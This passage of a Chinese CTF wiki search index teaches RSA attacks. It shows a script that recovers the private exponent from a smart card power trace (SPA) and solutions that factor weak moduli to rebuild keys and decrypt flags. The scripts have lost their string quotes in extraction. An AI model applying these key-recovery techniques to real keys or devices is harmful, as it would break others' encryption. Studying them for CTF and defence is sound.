            "text": "\u80fd\u91cf\u5206\u6790\u653b\u51fb\uff08\u4fa7\u4fe1\u9053\u653b\u51fb\uff09\u662f\u4e00\u79cd\u80fd\u591f\u4ece\u5bc6\u7801\u8bbe\u5907\u4e2d\u83b7\u53d6\u79d8\u5bc6\u4fe1\u606f\u7684\u5bc6\u7801\u653b\u51fb\u65b9\u6cd5\uff0e\u4e0e\u5176\n\u4ed6\u653b\u51fb\u65b9\u6cd5\u4e0d\u540c\uff1a\u8fd9\u79cd\u653b\u51fb\u5229\u7528\u7684\u662f\u5bc6\u7801\u8bbe\u5907\u7684\u80fd\u91cf\u6d88\u8017\u7279\u5f81\uff0c\u800c\u975e\u5bc6\u7801\u7b97\u6cd5\u7684\u6570\u5b66\u7279\u6027\uff0e\u80fd\u91cf\u5206\u6790\u653b\u51fb\u662f\u4e00\u79cd\u975e\u5165\u4fb5\u5f0f\u653b\u51fb\uff0c\u653b\u51fb\u8005\u53ef\u4ee5\u65b9\u4fbf\u5730\u8d2d\u4e70\u5b9e\u65bd\u653b\u51fb\u6240\u9700\u8981\u7684\u8bbe\u5907\uff1a\u6240\u4ee5\u8fd9\u79cd\u653b\u51fb\u5bf9\u667a\u80fd\u5361\u4e4b\u7c7b\u7684\u5bc6\u7801\u8bbe\u5907\u7684\u5b89\u5168\u6027\u9020\u6210\u4e86\u4e25\u91cd\u5a01\u80c1\u3002  \u80fd\u91cf\u5206\u6790\u653b\u51fb\u662f\u5b89\u5168\u9886\u57df\u5185\u975e\u5e38\u91cd\u8981\u7684\u4e00\u4e2a\u90e8\u5206\uff0c\u6211\u4eec\u53ea\u5728\u8fd9\u91cc\u7b80\u5355\u8ba8\u8bba\u4e0b\u3002  \u80fd\u91cf\u5206\u6790\u653b\u51fb\u5206\u4e3a\uff1a\n- \u7b80\u5355\u80fd\u91cf\u5206\u6790\u653b\u51fb\uff08SPA\uff09\uff0c\u5373\u5bf9\u80fd\u91cf\u8ff9\u8fdb\u884c\u76f4\u89c2\u5206\u6790\uff0c\u8089\u773c\u770b\u5373\u53ef\u3002\n- \u5dee\u5206\u80fd\u91cf\u5206\u6790\u653b\u51fb\uff08DPA\uff09\uff0c\u57fa\u4e8e\u80fd\u91cf\u8ff9\u4e4b\u95f4\u7684\u76f8\u5173\u7cfb\u6570\u8fdb\u884c\u5206\u6790\u3002", 
            "title": "RSA \u4fa7\u4fe1\u9053\u653b\u51fb"
        }, 
        {
            "location": "/crypto/asymmetric/rsa/rsa_side_channel/#_1", 
            "text": "\u653b\u51fb\u8005\u53ef\u83b7\u53d6\u4e0e\u52a0\u89e3\u5bc6\u76f8\u5173\u7684\u4fa7\u4fe1\u9053\u4fe1\u606f\uff0c\u4f8b\u5982\u80fd\u91cf\u6d88\u8017\u3001\u8fd0\u7b97\u65f6\u95f4\u3001\u7535\u78c1\u8f90\u5c04\u7b49\u7b49\u3002", 
            "title": "\u653b\u51fb\u6761\u4ef6"
        }, 
        {
            "location": "/crypto/asymmetric/rsa/rsa_side_channel/#_2", 
            "text": "\u8fd9\u91cc\u6211\u4eec\u4ee5 HITB 2017 \u7684 Hack in the card I \u4f5c\u4e3a\u4f8b\u5b50\u3002  \u9898\u76ee\u7ed9\u51fa\u4e86\u516c\u94a5\u6587\u4ef6  publickey.pem \uff0c\u5bc6\u6587\uff0c\u6d4b\u91cf\u667a\u80fd\u5361\u529f\u7387\u7684\u7535\u8def\u56fe\uff0c\u548c \u89e3\u5bc6 \u8fc7\u7a0b\u4e2d\u667a\u80fd\u5361\u6d88\u8017\u7684\u529f\u7387\u53d8\u5316\uff08\u901a\u8fc7\u5728\u7ebf\u7f51\u7ad9\u7ed9\u51fa  trace \uff09\u3002\n\u200b    \u5bc6\u6587\uff1a 014b05e1a09668c83e13fda8be28d148568a2342aed833e0ad646bd45461da2decf9d538c2d3ab245b272873beb112586bb7b17dc4b30f0c5408d8b03cfbc8388b2bd579fb419a1cac38798da1c3da75dc9a74a90d98c8f986fd8ab8b2dc539768beb339cadc13383c62b5223a50e050cb9c6b759072962c2b2cf21b4421ca73394d9e12cfbc958fc5f6b596da368923121e55a3c6a7b12fdca127ecc0e8470463f6e04f27cd4bb3de30555b6c701f524c8c032fa51d719901e7c75cc72764ac00976ac6427a1f483779f61cee455ed319ee9071abefae4473e7c637760b4b3131f25e5eb9950dd9d37666e129640c82a4b01b8bdc1a78b007f8ec71e7bad48046", 
            "title": "\u4f8b\u5b50"
        }, 
        {
            "location": "/crypto/asymmetric/rsa/rsa_side_channel/#_3", 
            "text": "\u7531\u4e8e\u7f51\u7ad9\u53ea\u7ed9\u51fa\u4e86\u4e00\u6761\u80fd\u91cf\u8ff9\uff0c\u6240\u4ee5\u53ef\u4ee5\u65ad\u5b9a\u8fd9\u662f Simple channel analysis\uff08SPA\uff09\u653b\u51fb\u3002\u90a3\u4e48\u6211\u4eec\u53ef\u4ee5\u76f4\u63a5\u901a\u8fc7\u89c2\u5bdf\u80fd\u91cf\u8ff9\u7684\u9ad8\u4f4e\u7535\u5e73\u6765\u83b7\u5f97 RSA \u89e3\u5bc6\u8fc7\u7a0b\u7684\u5bc6\u94a5 d\u3002\nRSA \u53ef\u88ab SPA \u653b\u51fb\u7684\u7406\u8bba\u57fa\u7840\u6765\u81ea\u4e8e RSA \u4e2d\u5305\u542b\u7684\u5feb\u901f\u5e42\u53d6\u4f59\u7b97\u6cd5\u3002  \u5feb\u901f\u5e42\u7b97\u6cd5\u5982\u4e0b   b \u4e3a\u5076\u6570\u65f6\uff0c a^b \\bmod c = ({a^2}^{b/2}) \\bmod c a^b \\bmod c = ({a^2}^{b/2}) \\bmod c \u3002  b \u4e3a\u5947\u6570\u65f6\uff0c a^b \\bmod c = ({a^2}^{b/2} \\times a) \\bmod c a^b \\bmod c = ({a^2}^{b/2} \\times a) \\bmod c \u3002   \u76f8\u5e94\u7684 C \u4ee3\u7801\u5b9e\u73b0\u4e3a\uff1a int   PowerMod ( int   a ,   int   b ,   int   c )  { \n     int   ans   =   1 ; \n     a   =   a   %   c ; \n     while ( b 0 )   { \n         if ( b   %   2   ==   1 )   // \u5f53b\u4e3a\u5947\u6570\u65f6\u4f1a\u591a\u6267\u884c\u4e0b\u9762\u7684\u6307\u4ee4 \n             ans   =   ( ans   *   a )   %   c ; \n         b   =   b / 2 ; \n         a   =   ( a   *   a )   %   c ; \n     } \n     return   ans ;  }   \u7531\u4e8e\u5feb\u901f\u5e42\u7684\u8ba1\u7b97\u8fc7\u7a0b\u4e2d\u4f1a\u9010\u4f4d\u5224\u65ad\u6307\u6570\u7684\u53d6\u503c\uff0c\u5e76\u4f1a\u91c7\u53d6\u4e0d\u540c\u7684\u64cd\u4f5c\uff0c\u6240\u4ee5\u53ef\u4ece\u80fd\u91cf\u8ff9\u4e2d\u8fd8\u539f\u51fa d \u7684\u53d6\u503c\uff08\u4ece\u4e0a\u9762\u53ef\u77e5\uff0c\u76f4\u63a5\u5f97\u5230\u7684\u503c\u662f d \u7684\u4e8c\u8fdb\u5236\u53d6\u503c\u7684 \u9006\u5e8f \uff09\u3002  \u6ce8\u610f \uff1a   \u6709\u65f6\u5019\u6a21\u4e58\u4e5f\u53ef\u80fd\u4f1a\u4ece\u9ad8\u4f4d\u5411\u4f4e\u4f4d\u8fdb\u884c\u6a21\u4e58\u3002\u8fd9\u91cc\u662f\u4ece\u4f4e\u4f4d\u5411\u9ad8\u4f4d\u6a21\u4e58\u3002    \u7531\u6b64\u53ef\u7ed9\u51fa\u8fd8\u539f d \u7684\u811a\u672c\u5982\u4e0b\uff1a  f   =   open ( ./data.txt )  data   =   f . read () . split ( , )  print ( point number: ,   len ( data ))  start_point   =   225     # \u5f00\u59cb\u5206\u6790\u7684\u70b9  mid   =   50              # \u91c7\u6837\u70b9\u95f4\u9694  fence   =   228           # \u9ad8\u4f4e\u7535\u5e73\u5206\u754c\u7ebf  bin_array   =   []  for   point_index   in   range ( start_point ,   len ( data ),   mid ): \n     if   float ( data [ point_index ])     fence : \n         bin_array . append ( 1 ) \n     else : \n         bin_array . append ( 0 )  bin_array2   =   []  flag1   =   0  flag2   =   0  for   x   in   bin_array : \n     if   x : \n         if   flag1 : \n             flag2   =   1 \n         else : \n             flag1   =   1 \n     else : \n         if   flag2 : \n             bin_array2 . append ( 1 ) \n         else : \n             bin_array2 . append ( 0 ) \n         flag1   =   0 \n         flag2   =   0  # d_bin = bin_array2[::-1]  d_bin   =   bin_array2  d   =   . join ( str ( x )   for   x   in   d_bin )[:: - 1 ]  print ( d )  d_int   =   int ( d , 2 )  print ( d_int )", 
            "title": "\u5206\u6790"
        }, 
        {
            "location": "/crypto/asymmetric/rsa/rsa_side_channel/#_4", 
            "text": "Mangard, S., Oswald, E., Popp, T., \u51af\u767b\u56fd, \u5468\u6c38\u5f6c,   \u5218\u7ee7\u4e1a. (2010). \u80fd\u91cf\u5206\u6790\u653b\u51fb.", 
            "title": "\u53c2\u8003\u8d44\u6599"
        }, 
        {
            "location": "/crypto/asymmetric/rsa/rsa_pkcs_attack/", 
            "text": "Bleichenbacher's attack\n\n\n\n\nPKCS 1.5 \u6807\u51c6\u4e2d\u53ef\u4ee5\u4f2a\u9020 RSA \u7b7e\u540d\u200b\n\n\n\n\n\n\nWarning\n\n\n\u5f85\u8865\u5145\u3002\n\n\n\n\n\n\nhttp://ddaa.tw/gctf_crypto_201_rsa_ctf_challenge.html", 
            "title": "Bleichenbacher \u653b\u51fb"
        }, 
        {
            "location": "/crypto/asymmetric/rsa/rsa_pkcs_attack/#bleichenbachers-attack", 
            "text": "PKCS 1.5 \u6807\u51c6\u4e2d\u53ef\u4ee5\u4f2a\u9020 RSA \u7b7e\u540d\u200b    Warning  \u5f85\u8865\u5145\u3002    http://ddaa.tw/gctf_crypto_201_rsa_ctf_challenge.html", 
            "title": "Bleichenbacher's attack"
        }, 
        {
            "location": "/crypto/asymmetric/rsa/rsa_complex/", 
            "text": "2016 ASIS Find the flag\n\n\n\u8fd9\u91cc\u6211\u4eec\u4ee5 ASIS 2016 \u7ebf\u4e0a\u8d5b\u4e2d Find the flag \u4e3a\u4f8b\u8fdb\u884c\u4ecb\u7ecd\u3002\n\n\n\u6587\u4ef6\u89e3\u538b\u51fa\u6765\uff0c\u6709\u4e00\u4e2a\u5bc6\u6587\uff0c\u4e00\u4e2a\u516c\u94a5\uff0c\u4e00\u4e2a py \u811a\u672c\u3002\u770b\u4e00\u4e0b\u516c\u94a5\u3002\n\n\n\u279c  RSA openssl rsa -pubin -in pubkey.pem -text -modulus\nPublic-Key: \n(\n256\n bit\n)\n\nModulus:\n    \n00\n:d8:e2:4c:12:b7:b9:9e:fe:0a:9b:c0:4a:6a:3d:\n    f5:8a:2a:94:42:69:b4:92:b7:37:6d:f1:29:02:3f:\n    \n20\n:61:b9\nExponent: \n12405943493775545863\n \n(\n0xac2ac3e0ca0f5607\n)\n\n\nModulus\n=\nD8E24C12B7B99EFE0A9BC04A6A3DF58A2A944269B492B7376DF129023F2061B9\n\n\n\n\n\u8fd9\u4e48\u5c0f\u7684\u4e00\u4e2a \nN\nN\n\uff0c\u5148\u5206\u89e3\u4e00\u4e0b\u3002\n\n\np = 311155972145869391293781528370734636009\nq = 315274063651866931016337573625089033553\n\n\n\n\n\u518d\u770b\u7ed9\u7684 py \u811a\u672c\u3002\n\n\n#!/usr/bin/python\n\n\nimport\n \ngmpy\n\n\nfrom\n \nCrypto.Util.number\n \nimport\n \n*\n\n\nfrom\n \nCrypto.PublicKey\n \nimport\n \nRSA\n\n\nfrom\n \nCrypto.Cipher\n \nimport\n \nPKCS1_v1_5\n\n\n\nflag\n \n=\n \nopen\n(\nflag\n,\n \nr\n)\n.\nread\n()\n \n*\n \n30\n\n\n\ndef\n \next_rsa_encrypt\n(\np\n,\n \nq\n,\n \ne\n,\n \nmsg\n):\n\n    \nm\n \n=\n \nbytes_to_long\n(\nmsg\n)\n\n    \nwhile\n \nTrue\n:\n\n        \nn\n \n=\n \np\n \n*\n \nq\n\n        \ntry\n:\n\n            \nphi\n \n=\n \n(\np\n \n-\n \n1\n)\n*\n(\nq\n \n-\n \n1\n)\n\n            \nd\n \n=\n \ngmpy\n.\ninvert\n(\ne\n,\n \nphi\n)\n\n            \npubkey\n \n=\n \nRSA\n.\nconstruct\n((\nlong\n(\nn\n),\n \nlong\n(\ne\n)))\n\n            \nkey\n \n=\n \nPKCS1_v1_5\n.\nnew\n(\npubkey\n)\n\n            \nenc\n \n=\n \nkey\n.\nencrypt\n(\nmsg\n)\n.\nencode\n(\nbase64\n)\n\n            \nreturn\n \nenc\n\n        \nexcept\n:\n\n            \np\n \n=\n \ngmpy\n.\nnext_prime\n(\np\n**\n2\n \n+\n \nq\n**\n2\n)\n\n            \nq\n \n=\n \ngmpy\n.\nnext_prime\n(\n2\n*\np\n*\nq\n)\n\n            \ne\n \n=\n \ngmpy\n.\nnext_prime\n(\ne\n**\n2\n)\n\n\n\np\n \n=\n \ngetPrime\n(\n128\n)\n\n\nq\n \n=\n \ngetPrime\n(\n128\n)\n\n\nn\n \n=\n \np\n*\nq\n\n\ne\n \n=\n \ngetPrime\n(\n64\n)\n\n\npubkey\n \n=\n \nRSA\n.\nconstruct\n((\nlong\n(\nn\n),\n \nlong\n(\ne\n)))\n\n\nf\n \n=\n \nopen\n(\npubkey.pem\n,\n \nw\n)\n\n\nf\n.\nwrite\n(\npubkey\n.\nexportKey\n())\n\n\ng\n \n=\n \nopen\n(\nflag.enc\n,\n \nw\n)\n\n\ng\n.\nwrite\n(\next_rsa_encrypt\n(\np\n,\n \nq\n,\n \ne\n,\n \nflag\n))\n\n\n\n\n\n\u903b\u8f91\u5f88\u7b80\u5355\uff0c\u8bfb\u53d6 flag\uff0c\u91cd\u590d 30 \u904d\u4e3a\u5bc6\u6587\u3002\u968f\u673a\u53d6 \np\np\n \u548c \nq\nq\n\uff0c\u751f\u6210\u4e00\u4e2a\u516c\u94a5\uff0c\u5199\u5165 \npubkey.pem\n\uff0c\u518d\u7528\u811a\u672c\u4e2d\u7684 \next_rsa_encrypt\n \u51fd\u6570\u8fdb\u884c\u52a0\u5bc6\uff0c\u6700\u540e\u5c06\u5bc6\u6587\u5199\u5165 \nflag.enc\n\u3002\n\n\n\u5c1d\u8bd5\u4e00\u4e0b\u89e3\u5bc6\uff0c\u63d0\u793a\u5bc6\u6587\u8fc7\u957f\uff0c\u518d\u770b\u52a0\u5bc6\u51fd\u6570\uff0c\u539f\u6765\u5f53\u52a0\u5bc6\u5931\u8d25\u65f6\uff0c\u51fd\u6570\u4f1a\u8df3\u5230\u5f02\u5e38\u5904\u7406\uff0c\u4ee5\u4e00\u5b9a\u7b97\u6cd5\u91cd\u65b0\u53d6\u66f4\u5927\u7684 \np\np\n \u548c \nq\nq\n\uff0c\u76f4\u5230\u52a0\u5bc6\u6210\u529f\u3002\n\n\n\u90a3\u4e48\u6211\u4eec\u53ea\u8981\u4e5f\u5199\u4e00\u4e2a\u76f8\u5e94\u7684\u89e3\u5bc6\u51fd\u6570\u5373\u53ef\u3002\n\n\n#!/usr/bin/python\n\n\nimport\n \ngmpy\n\n\nfrom\n \nCrypto.Util.number\n \nimport\n \n*\n\n\nfrom\n \nCrypto.PublicKey\n \nimport\n \nRSA\n\n\nfrom\n \nCrypto.Cipher\n \nimport\n \nPKCS1_v1_5\n\n\n\ndef\n \next_rsa_decrypt\n(\np\n,\n \nq\n,\n \ne\n,\n \nmsg\n):\n\n    \nm\n \n=\n \nbytes_to_long\n(\nmsg\n)\n\n    \nwhile\n \nTrue\n:\n\n        \nn\n \n=\n \np\n \n*\n \nq\n\n        \ntry\n:\n\n            \nphi\n \n=\n \n(\np\n \n-\n \n1\n)\n*\n(\nq\n \n-\n \n1\n)\n\n            \nd\n \n=\n \ngmpy\n.\ninvert\n(\ne\n,\n \nphi\n)\n\n            \nprivatekey\n \n=\n \nRSA\n.\nconstruct\n((\nlong\n(\nn\n),\n \nlong\n(\ne\n),\n \nlong\n(\nd\n),\n \nlong\n(\np\n),\n \nlong\n(\nq\n)))\n\n            \nkey\n \n=\n \nPKCS1_v1_5\n.\nnew\n(\nprivatekey\n)\n\n            \nde_error\n \n=\n \n\n            \nenc\n \n=\n \nkey\n.\ndecrypt\n(\nmsg\n.\ndecode\n(\nbase64\n),\n \nde_error\n)\n\n            \nreturn\n \nenc\n\n        \nexcept\n \nException\n \nas\n \nerror\n:\n\n            \nprint\n \nerror\n\n            \np\n \n=\n \ngmpy\n.\nnext_prime\n(\np\n**\n2\n \n+\n \nq\n**\n2\n)\n\n            \nq\n \n=\n \ngmpy\n.\nnext_prime\n(\n2\n*\np\n*\nq\n)\n\n            \ne\n \n=\n \ngmpy\n.\nnext_prime\n(\ne\n**\n2\n)\n\n\n\np\n \n=\n \n311155972145869391293781528370734636009\n\n\nq\n \n=\n \n315274063651866931016337573625089033553\n\n\nn\n \n=\n \np\n*\nq\n\n\ne\n \n=\n \n12405943493775545863\n \n\n# pubkey = RSA.construct((long(n), long(e)))\n\n\n# f = open(\npubkey.pem\n, \nw\n)\n\n\n# f.write(pubkey.exportKey())\n\n\ng\n \n=\n \nopen\n(\nflag.enc\n,\n \nr\n)\n\n\nmsg\n \n=\n \ng\n.\nread\n()\n\n\nflag\n \n=\n \next_rsa_decrypt\n(\np\n,\n \nq\n,\n \ne\n,\n \nmsg\n)\n\n\nprint\n \nflag\n\n\n\n\n\n\u62ff\u5230 flag\n\n\nASIS{F4ct0R__N_by_it3rat!ng!}\n\n\n\n\nSCTF RSA1\n\n\n\u8fd9\u91cc\u6211\u4eec\u4ee5 SCTF RSA1 \u4e3a\u4f8b\u8fdb\u884c\u4ecb\u7ecd\uff0c\u9996\u5148\u89e3\u538b\u538b\u7f29\u5305\u540e\uff0c\u5f97\u5230\u5982\u4e0b\u6587\u4ef6\n\n\n\u279c  level0 git:\n(\nmaster\n)\n \u2717 ls -al\n\u603b\u7528\u91cf \n4\n\ndrwxrwxrwx \n1\n root root    \n0\n \n7\n\u6708  \n30\n \n16\n:36 .\ndrwxrwxrwx \n1\n root root    \n0\n \n7\n\u6708  \n30\n \n16\n:34 ..\n-rwxrwxrwx \n1\n root root  \n349\n \n5\n\u6708   \n2\n  \n2016\n level1.passwd.enc\n-rwxrwxrwx \n1\n root root \n2337\n \n5\n\u6708   \n6\n  \n2016\n level1.zip\n-rwxrwxrwx \n1\n root root  \n451\n \n5\n\u6708   \n2\n  \n2016\n public.key\n\n\n\n\n\u5c1d\u8bd5\u89e3\u538b\u7f29\u4e86\u4e00\u4e0b level1.zip \u73b0\u9700\u8981\u5bc6\u7801\u3002\u7136\u540e\u6839\u636e level1.passwd.enc \u53ef\u77e5\uff0c\u5e94\u8be5\u662f\u6211\u4eec\u9700\u8981\u89e3\u5bc6\u8fd9\u4e2a\u6587\u4ef6\u624d\u80fd\u5f97\u5230\u5bf9\u5e94\u7684\u5bc6\u7801\u3002\u67e5\u770b\u516c\u94a5\n\n\n\u279c  level0 git:\n(\nmaster\n)\n \u2717 openssl rsa -pubin -in public.key -text -modulus \nPublic-Key: \n(\n2048\n bit\n)\n\nModulus:\n    \n00\n:94:a0:3e:6e:0e:dc:f2:74:10:52:ef:1e:ea:a8:\n    \n89\n:d6:f9:8d:01:11:51:db:5e:90:92:48:fd:39:0c:\n    \n70\n:87:24:d8:98:3c:f3:33:1c:ba:c5:61:c2:ce:2c:\n    5a:f1:5e:65:b2:b2:46:91:56:b6:19:d5:d3:b2:a6:\n    bb:a3:7d:56:93:99:4d:7e:4c:2f:aa:60:7b:3e:c8:\n    fc:90:b2:00:62:4b:53:18:5b:a2:30:10:60:a8:21:\n    ab:61:57:d7:e7:cc:67:1b:4d:cd:66:4c:7d:f1:1a:\n    2a:1d:5e:50:80:c1:5e:45:12:3a:ba:4a:53:64:d8:\n    \n72\n:1f:84:4a:ae:5c:55:02:e8:8e:56:4d:38:70:a5:\n    \n16\n:36:d3:bc:14:3e:2f:ae:2f:31:58:ba:00:ab:ac:\n    c0:c5:ba:44:3c:29:70:56:01:6b:57:f5:d7:52:d7:\n    \n31\n:56:0b:ab:0a:e6:8d:ad:08:22:a9:1f:cb:6e:49:\n    cc:01:4c:12:d2:ab:a3:a5:97:e5:10:49:19:7f:69:\n    d9:3b:c5:53:53:71:00:18:60:cc:69:1a:06:64:3b:\n    \n86\n:94:70:a9:da:82:fc:54:6b:06:23:43:2d:b0:20:\n    eb:b6:1b:91:35:5e:53:a6:e5:d8:9a:84:bb:30:46:\n    b8:9f:63:bc:70:06:2d:59:d8:62:a5:fd:5c:ab:06:\n    \n68\n:81\nExponent: \n65537\n \n(\n0x10001\n)\n\n\nModulus\n=\n94A03E6E0EDCF2741052EF1EEAA889D6F98D011151DB5E909248FD390C708724D8983CF3331CBAC561C2CE2C5AF15E65B2B2469156B619D5D3B2A6BBA37D5693994D7E4C2FAA607B3EC8FC90B200624B53185BA2301060A821AB6157D7E7CC671B4DCD664C7DF11A2A1D5E5080C15E45123ABA4A5364D8721F844AAE5C5502E88E564D3870A51636D3BC143E2FAE2F3158BA00ABACC0C5BA443C297056016B57F5D752D731560BAB0AE68DAD0822A91FCB6E49CC014C12D2ABA3A597E51049197F69D93BC5535371001860CC691A06643B869470A9DA82FC546B0623432DB020EBB61B91355E53A6E5D89A84BB3046B89F63BC70062D59D862A5FD5CAB066881\nwriting RSA key\n-----BEGIN PUBLIC KEY-----\nMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAlKA+bg7c8nQQUu8e6qiJ\n1vmNARFR216Qkkj9OQxwhyTYmDzzMxy6xWHCzixa8V5lsrJGkVa2GdXTsqa7o31W\nk5lNfkwvqmB7Psj8kLIAYktTGFuiMBBgqCGrYVfX58xnG03NZkx98RoqHV5QgMFe\nRRI6ukpTZNhyH4RKrlxVAuiOVk04cKUWNtO8FD4vri8xWLoAq6zAxbpEPClwVgFr\nV/XXUtcxVgurCuaNrQgiqR/LbknMAUwS0qujpZflEEkZf2nZO8VTU3EAGGDMaRoG\nZDuGlHCp2oL8VGsGI0MtsCDrthuRNV5TpuXYmoS7MEa4n2O8cAYtWdhipf1cqwZo\ngQIDAQAB\n-----END PUBLIC KEY-----\n\n\n\n\n\u53d1\u73b0\u867d\u7136\u8bf4\u662f 2048 \u4f4d\uff0c\u4f46\u662f\u663e\u7136\u6a21\u6570\u6ca1\u6709\u90a3\u4e48\u957f\uff0c\u5c1d\u8bd5\u5206\u89e3\u4e0b\uff0c\u5f97\u5230\n\n\np=250527704258269\nq=74891071972884336452892671945839935839027130680745292701175368094445819328761543101567760612778187287503041052186054409602799660254304070752542327616415127619185118484301676127655806327719998855075907042722072624352495417865982621374198943186383488123852345021090112675763096388320624127451586578874243946255833495297552979177208715296225146999614483257176865867572412311362252398105201644557511678179053171328641678681062496129308882700731534684329411768904920421185529144505494827908706070460177001921614692189821267467546120600239688527687872217881231173729468019623441005792563703237475678063375349\n\n\n\n\n\u7136\u540e\u5c31\u53ef\u4ee5\u6784\u9020\uff0c\u5e76\u4e14\u89e3\u5bc6\uff0c\u4ee3\u7801\u5982\u4e0b\n\n\nfrom\n \nCrypto.PublicKey\n \nimport\n \nRSA\n\n\nimport\n \ngmpy2\n\n\nfrom\n \nbase64\n \nimport\n \nb64decode\n\n\np\n \n=\n \n250527704258269\n\n\nq\n \n=\n \n74891071972884336452892671945839935839027130680745292701175368094445819328761543101567760612778187287503041052186054409602799660254304070752542327616415127619185118484301676127655806327719998855075907042722072624352495417865982621374198943186383488123852345021090112675763096388320624127451586578874243946255833495297552979177208715296225146999614483257176865867572412311362252398105201644557511678179053171328641678681062496129308882700731534684329411768904920421185529144505494827908706070460177001921614692189821267467546120600239688527687872217881231173729468019623441005792563703237475678063375349\n\n\ne\n \n=\n \n65537\n\n\nn\n \n=\n \np\n \n*\n \nq\n\n\n\n\ndef\n \ngetprivatekey\n(\nn\n,\n \ne\n,\n \np\n,\n \nq\n):\n\n    \nphin\n \n=\n \n(\np\n \n-\n \n1\n)\n \n*\n \n(\nq\n \n-\n \n1\n)\n\n    \nd\n \n=\n \ngmpy2\n.\ninvert\n(\ne\n,\n \nphin\n)\n\n    \npriviatekey\n \n=\n \nRSA\n.\nconstruct\n((\nlong\n(\nn\n),\n \nlong\n(\ne\n),\n \nlong\n(\nd\n)))\n\n    \nwith\n \nopen\n(\nprivate.pem\n,\n \nw\n)\n \nas\n \nf\n:\n\n        \nf\n.\nwrite\n(\npriviatekey\n.\nexportKey\n())\n\n\n\n\ndef\n \ndecrypt\n():\n\n    \nwith\n \nopen\n(\n./level1.passwd.enc\n)\n \nas\n \nf\n:\n\n        \ncipher\n \n=\n \nf\n.\nread\n()\n\n    \ncipher\n \n=\n \nb64decode\n(\ncipher\n)\n\n    \nwith\n \nopen\n(\n./private.pem\n)\n \nas\n \nf\n:\n\n        \nkey\n \n=\n \nRSA\n.\nimportKey\n(\nf\n)\n\n    \nprint\n \nkey\n.\ndecrypt\n(\ncipher\n)\n\n\n\n\n#getprivatekey(n, e, p, q)\n\n\ndecrypt\n()\n\n\n\n\n\n\u53d1\u73b0\u4e0d\u5bf9\n\n\n\u279c  level0 git:\n(\nmaster\n)\n \u2717 python exp.py\n\u4e00\u5806\u4e71\u7801\u3002\u3002\n\n\n\n\n\u8fd9\u65f6\u5019\u5c31\u8981\u8003\u8651\u5176\u4ed6\u60c5\u51b5\u4e86\uff0c\u4e00\u822c\u6765\u8bf4\u73b0\u5b9e\u4e2d\u5b9e\u73b0\u7684 RSA \u90fd\u4e0d\u4f1a\u76f4\u63a5\u7528\u539f\u751f\u7684 RSA\uff0c\u90fd\u4f1a\u52a0\u4e00\u4e9b\u586b\u5145\u6bd4\u5982 OAEP\uff0c\u6211\u4eec\u8fd9\u91cc\u8bd5\u8bd5\uff0c\u4fee\u6539\u4ee3\u7801\n\n\ndef decrypt1\n()\n:\n    with open\n(\n./level1.passwd.enc\n)\n as f:\n        \ncipher\n \n=\n f.read\n()\n\n    \ncipher\n \n=\n b64decode\n(\ncipher\n)\n\n    with open\n(\n./private.pem\n)\n as f:\n        \nkey\n \n=\n RSA.importKey\n(\nf\n)\n\n        \nkey\n \n=\n PKCS1_OAEP.new\n(\nkey\n)\n\n    print key.decrypt\n(\ncipher\n)\n\n\n\n\n\n\u679c\u7136\u5982\u6b64\uff0c\u5f97\u5230\n\n\n\u279c  level0 git:\n(\nmaster\n)\n \u2717 python exp.py\nFaC5ori1ati0n_aTTA3k_p_tOO_sma11\n\n\n\n\n\u5f97\u5230\u89e3\u538b\u5bc6\u7801\u3002\u7ee7\u7eed\uff0c\u67e5\u770b level1 \u4e2d\u7684\u516c\u94a5\n\n\n\u279c  level1 git:\n(\nmaster\n)\n \u2717 openssl rsa -pubin -in public.key -text -modulus\nPublic-Key: \n(\n2048\n bit\n)\n\nModulus:\n    \n00\n:c3:26:59:69:e1:ed:74:d2:e0:b4:9a:d5:6a:7c:\n    2f:2a:9e:c3:71:ff:13:4b:10:37:c0:6f:56:19:34:\n    c5:cb:1f:6d:c0:e3:57:3b:47:c4:76:3e:21:a3:b0:\n    \n11\n:11:78:d4:ee:4f:e8:99:2b:15:cb:cb:d7:73:e4:\n    f9:a6:28:20:fd:db:8c:ea:16:ed:67:c2:48:12:6e:\n    4b:01:53:4a:67:cb:22:23:3b:34:2e:af:13:ef:93:\n    \n45\n:16:2b:00:9f:e0:4b:d1:90:c9:2c:27:9a:34:c3:\n    3f:d7:ee:40:f5:82:50:39:aa:8c:e9:c2:7b:f4:36:\n    e3:38:9d:04:50:db:a9:b7:3f:4b:2a:d6:8a:2a:5c:\n    \n87\n:2a:eb:74:35:98:6a:9c:e4:52:cb:93:78:d2:da:\n    \n39\n:83:f3:0c:d1:65:1e:66:9c:40:56:06:0d:58:fc:\n    \n41\n:64:5e:06:da:83:d0:3b:06:42:70:da:38:53:e0:\n    \n54\n:35:53:ce:de:79:4a:bf:f5:3b:e5:53:7f:6c:18:\n    \n12\n:67:a9:de:37:7d:44:65:5e:68:0a:78:39:3d:bb:\n    \n00\n:22:35:0e:a3:94:e6:94:15:1a:3d:39:c7:50:0e:\n    b1:64:a5:29:a3:69:41:40:69:94:b0:0d:1a:ea:9a:\n    \n12\n:27:50:ee:1e:3a:19:b7:29:70:b4:6d:1e:9d:61:\n    3e:7d\nExponent: \n65537\n \n(\n0x10001\n)\n\n\nModulus\n=\nC3265969E1ED74D2E0B49AD56A7C2F2A9EC371FF134B1037C06F561934C5CB1F6DC0E3573B47C4763E21A3B0111178D4EE4FE8992B15CBCBD773E4F9A62820FDDB8CEA16ED67C248126E4B01534A67CB22233B342EAF13EF9345162B009FE04BD190C92C279A34C33FD7EE40F5825039AA8CE9C27BF436E3389D0450DBA9B73F4B2AD68A2A5C872AEB7435986A9CE452CB9378D2DA3983F30CD1651E669C4056060D58FC41645E06DA83D03B064270DA3853E0543553CEDE794ABFF53BE5537F6C181267A9DE377D44655E680A78393DBB0022350EA394E694151A3D39C7500EB164A529A36941406994B00D1AEA9A122750EE1E3A19B72970B46D1E9D613E7D\nwriting RSA key\n-----BEGIN PUBLIC 